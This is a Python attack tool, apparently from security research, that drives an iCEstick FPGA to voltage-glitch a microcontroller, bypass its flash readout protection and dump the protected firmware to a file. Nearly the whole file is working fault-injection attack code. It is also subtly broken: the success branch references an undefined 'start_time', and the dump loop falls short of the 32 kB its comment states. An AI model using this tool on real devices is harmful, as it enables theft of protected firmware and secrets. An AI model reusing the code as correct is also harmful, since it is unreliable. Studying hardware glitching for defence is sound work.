
__version__ = '0.5'
__author__ = 'Matthias Deeg'

import argparse

from binascii import hexlify
from codecs import decode
from datetime import datetime
from pylibftdi import Device, INTERFACE_B
from struct import pack
from sty import fg, ef
from time import sleep
import time

# some definitions
CRLF = b"\r\n"
SYNCHRONIZED = b"Synchronized"
OK = b"OK"
READ_FLASH_CHECK = b"R 0 4"
CRYSTAL_FREQ = b"10000" + CRLF
MAX_BYTES = 20
UART_TIMEOUT = 1
DUMP_FILE = "memory.dump"
RESULTS_FILE = "results.txt"

# FPGA commands for iCEstick voltage glitcher
CMD_PASSTHROUGH     = b"\x00"
CMD_RESET           = b"\x01"
CMD_SET_DURATION    = b"\x02"
CMD_SET_OFFSET      = b"\x03"
CMD_START_GLITCH    = b"\x04"


class Glitcher():
    """Simple iCEstick voltage glitcher"""

    def __init__(self, start_offset=0, end_offset=5000, offset_step=1,
            duration_step=1, start_duration=1, end_duration=30, retries=2):
        """Initialize the glitcher"""

        # set FTDI device for communication with iCEstick
        self.dev = Device(mode='b', interface_select=INTERFACE_B)

        # set baudrate
        self.dev.baudrate = 115200

        # set offset and duration steps
        self.offset_step = offset_step
        self.duration_step = duration_step
        self.start_offset = start_offset
        self.end_offset = end_offset
        self.start_duration = start_duration
        self.end_duration = end_duration
        self.retries = retries


    def read_data(self, terminator=b"\r\n", echo=True):
        """Read UART data with timeout"""
        if echo:
            c = b"\x00"
            start = time.time()
            while c != b"\r":
                c = self.dev.read(1)
                if time.time() - start > UART_TIMEOUT:
                    return b"UART_TIMEOUT"
    
        data = b""
        start = time.time()
        while True:
            data += self.dev.read(1)
            if data[-2:] == CRLF:
                break
            if time.time() - start > UART_TIMEOUT:
                return b"UART_TIMEOUT"
        return data.replace(terminator, b"")


    def synchronize(self):
        """UART synchronization with auto baudrate detection"""

        # use auto baudrate detection
        cmd = b"?"
        data = CMD_PASSTHROUGH + pack("B", len(cmd)) + cmd
        self.dev.write(data)

        # receive synchronized message
        resp = self.read_data(echo=False)

        if resp != SYNCHRONIZED:
            return False

        # respond with "Synchronized"
        cmd = SYNCHRONIZED + CRLF
        data = CMD_PASSTHROUGH + pack("B", len(cmd)) + cmd
        self.dev.write(data)

        # read response, should be "OK"
        resp = self.read_data()
        if resp != OK:
            return False

        # send crystal frequency (in kHz)
        self.dev.write(CMD_PASSTHROUGH + b"\x07" + CRYSTAL_FREQ)

        # read response, should be "OK"
        resp = self.read_data()
        if resp != OK:
            return False

        return True

    def read_command_response(self, response_count, echo=True, terminator=b"\r\n"):
        """Read command response from target device with timeout"""
    
        result = []
    
        # ---------- Echo部分 ----------
        if echo:
            c = b"\x00"
            start = time.time()
            while c != b"\r":
                c = self.dev.read(1)
                if time.time() - start > UART_TIMEOUT:
                    return ["TIMEOUT"]
    
        # ---------- 读取返回码 ----------
        data = b""
        start = time.time()
        while True:
            data += self.dev.read(1)
            if data[-2:] == terminator:
                break
            if time.time() - start > UART_TIMEOUT:
                return ["TIMEOUT"]
    
        return_code = data.replace(CRLF, b"")
        result.append(return_code)
    
        # ---------- 如果返回码不是成功，直接返回 ----------
        if return_code != b"0":
            return result
    
        # ---------- 读取响应数据 ----------
        for _ in range(response_count):
            data = b""
            start = time.time()
            while True:
                data += self.dev.read(1)
                if data[-2:] == terminator:
                    break
                if time.time() - start > UART_TIMEOUT:
                    return ["TIMEOUT"]
            result.append(data.replace(CRLF, b""))
    
        return result


    def send_target_command(self, command, response_count=0, echo=True, terminator=b"\r\n"):
        """Send command to target device"""

        # send command
        cmd = command + b"\x0d"
        data = CMD_PASSTHROUGH + pack("B", len(cmd)) + cmd
        self.dev.write(data)

        # read response
        resp = self.read_command_response(response_count, echo, terminator)

        return resp

    def reset_target(self):
        """Reset target device"""

        # send command
        self.dev.write(CMD_RESET)

    def set_glitch_duration(self, duration):
        """Send config command to set glitch duration in FPGA clock cycles"""

        # send command
        data = CMD_SET_DURATION + pack("<L", duration)
        self.dev.write(data)

    def set_glitch_offset(self, offset):
        """Send config command to set glitch offset in FPGA clock cycles"""

        # send command
        data = CMD_SET_OFFSET + pack("<L", offset)
        self.dev.write(data)

    def start_glitch(self):
        """Start glitch (actually start the offset counter)"""

        # send command
        self.dev.write(CMD_START_GLITCH)

    def dump_memory(self):
        """Dump the target device memory"""

        # dump the 32 kB flash memory and save the content to a file
        with open(DUMP_FILE, "wb") as f:

            # read all 32 kB of flash memory
            for i in range(1023):
                # first send "OK" to the target device
                resp = self.send_target_command(OK, 1, True, b"\r\n")

                # then a read command for 32 bytes
                cmd = "R {} 32".format(i * 32).encode("utf-8")
                resp = self.send_target_command(cmd, 1, True, b"\r\n")

                if resp[0] == b"0":
                    # read and decode uu-encodod data in a somewhat "hacky" way
                    data = b"begin 666 <data>\n" + resp[1] + b" \n \nend\n"
                    raw_data = decode(data, "uu")
                    print(fg.li_blue + bytes.hex(raw_data) + fg.rs)
                    f.write(raw_data)

        print(fg.li_white + "[*] Dumped memory written to '{}'".format(DUMP_FILE) + fg.rs)

    def run(self):
        for offset in range(self.start_offset, self.end_offset, self.offset_step):
            # duration in 10 ns increments
            for duration in range(self.start_duration, self.end_duration, self.duration_step):
                # better test more than once
                for i in range(self.retries):

                    # set glitch config
                    print(fg.li_white + "[*] Set glitch configuration ({},{})".format(offset, duration) + fg.rs)
                    self.set_glitch_offset(offset)
                    self.set_glitch_duration(duration)

                    # start glitch (start the offset counter)
                    self.start_glitch()

                    # reset target device
                    self.reset_target()

                    # synchronize with target
                    if not self.synchronize():
                        print(fg.li_red + "[-] Error during sychronisation" + fg.rs)
                        continue

                    # read flash memory address
                    resp = self.send_target_command(READ_FLASH_CHECK, 1, True, b"\r\n")

                    if resp[0] == b"0":
                        # measure the time again
                        end_time = datetime.now()

                        print(ef.bold + fg.green + "[*] Glitching success!\n"
                                "    Bypassed the readout protection with the following glitch parameters:\n"
                                "        offset   = {}\n        duration = {}\n".format(offset, duration) +
                                "    Time to find this glitch: {}".format(end_time - start_time) + fg.rs)

                        # save successful glitching configuration in file
                        config = "{},{},{},{}\n".format(offset, duration, resp[0], resp[1])
                        with open(RESULTS_FILE, "a") as f:
                            f.write(config)

                        # dump memory
                        print(fg.li_white + "[*] Dumping the flash memory ..." + fg.rs)
                        self.dump_memory()

                        return True

                    elif resp[0] != b"19":
                        print(fg.li_red + "[?] Unexpected response: {}".format(resp) + fg.rs)

        return False


def banner():
    """Show a fancy banner"""

    print(fg.li_white + "\n" +
""" ██▓ ▄████▄  ▓█████     ██▓ ▄████▄  ▓█████     ▄▄▄▄    ▄▄▄       ▄▄▄▄ ▓██   ██▓     ▄████  ██▓     ██▓▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  \n"""
"""▓██▒▒██▀ ▀█  ▓█   ▀    ▓██▒▒██▀ ▀█  ▓█   ▀    ▓█████▄ ▒████▄    ▓█████▄▒██  ██▒    ██▒ ▀█▒▓██▒    ▓██▒▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒\n"""
"""▒██▒▒▓█    ▄ ▒███      ▒██▒▒▓█    ▄ ▒███      ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██ ██░   ▒██░▄▄▄░▒██░    ▒██▒▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒\n"""
"""░██░▒▓▓▄ ▄██▒▒▓█  ▄    ░██░▒▓▓▄ ▄██▒▒▓█  ▄    ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░   ░▓█  ██▓▒██░    ░██░░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  \n"""
"""░██░▒ ▓███▀ ░░▒████▒   ░██░▒ ▓███▀ ░░▒████▒   ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░   ░▒▓███▀▒░██████▒░██░  ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒\n"""
"""░▓  ░ ░▒ ▒  ░░░ ▒░ ░   ░▓  ░ ░▒ ▒  ░░░ ▒░ ░   ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒     ░▒   ▒ ░ ▒░▓  ░░▓    ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░\n"""
""" ▒ ░  ░  ▒    ░ ░  ░    ▒ ░  ░  ▒    ░ ░  ░   ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░▓██ ░▒░      ░   ░ ░ ░ ▒  ░ ▒ ░    ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░\n"""
""" ▒ ░░           ░       ▒ ░░           ░       ░    ░   ░   ▒    ░    ░▒ ▒ ░░     ░ ░   ░   ░ ░    ▒ ░  ░      ░         ░  ░░ ░   ░     ░░   ░ \n"""
""" ░  ░ ░         ░  ░    ░  ░ ░         ░  ░    ░            ░  ░ ░     ░ ░              ░     ░  ░ ░           ░ ░       ░  ░  ░   ░  ░   ░     \n"""
"""    ░                      ░                        ░                 ░░ ░                                     ░                                \n"""
"""iCE iCE Baby Glitcher v{0} by Matthias Deeg - SySS GmbH\n""".format(__version__) + fg.white +
"""A very simple voltage glitcher implementation for the Lattice iCEstick Evaluation Kit\n"""
"""Based on and inspired by voltage glitcher implementations by Dmitry Nedospasov (@nedos)\n"""
"""and Grazfather (@Grazfather)\n---""" + fg.rs)


# main program
if __name__ == '__main__':
    # show banner
    banner()

    # init command line parser
    parser = argparse.ArgumentParser("./glitcher.py")
    parser.add_argument('--start_offset', type=int, default=100, help='start offset for glitch (default is 100)')
    parser.add_argument('--end_offset', type=int, default=10000, help='end offset for glitch (default is 10000)')
    parser.add_argument('--start_duration', type=int, default=1, help='start duration for glitch (default is 1)')
    parser.add_argument('--end_duration', type=int, default=30, help='end duration for glitch (default is 30)')
    parser.add_argument('--offset_step', type=int, default=1, help='offset step (default is 1)')
    parser.add_argument('--duration_step', type=int,default=1, help='duration step (default is 1)')
    parser.add_argument('--retries', type=int,default=2, help='number of retries per configuration (default is 2)')

    # parse command line arguments
    args = parser.parse_args()

    # create a glitcher
    glitcher = Glitcher(start_offset=args.start_offset,
            end_offset=args.end_offset,
            start_duration=args.start_duration,
            end_duration=args.end_duration,
            offset_step=args.offset_step,
            duration_step=args.duration_step,
            retries=args.retries)

    # run the glitcher with specified start parameters
    glitcher.run()
